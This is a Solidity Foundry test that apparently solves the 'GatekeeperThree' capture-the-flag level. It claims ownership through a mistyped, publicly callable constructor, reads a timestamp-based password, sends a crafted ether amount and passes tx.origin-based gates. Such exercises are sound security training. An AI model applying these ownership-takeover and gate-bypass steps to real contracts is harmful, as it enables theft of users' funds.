// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

// Ditto both gatekeepers (checking tx.origin)
interface IFactory {
  function createInstance(address _player) external payable returns (address);
  function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IGatekeeperThree {
  function construct0r() external;
  function createTrick() external;
  function getAllowance(uint256) external;
  function enter() external returns (bool);
}

contract GatekeeperThreeTest is Test {
  IFactory internal challengeFactory;
  address internal challengeAddress;

  function setUp() public {
    challengeFactory = IFactory(0x5B50F1F5fE2Bef0a0429fD27B8214d856066F45e);
    challengeAddress = challengeFactory.createInstance(tx.origin);
  }

  function testExploit() public {
    IGatekeeperThree gatekeeperThree = IGatekeeperThree(challengeAddress);

    gatekeeperThree.construct0r();

    gatekeeperThree.createTrick();
    gatekeeperThree.getAllowance(block.timestamp);

    (bool result,) = challengeAddress.call{value: 0.001000000000000001 ether}("");
    result;

    gatekeeperThree.enter();

    require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
  }
}
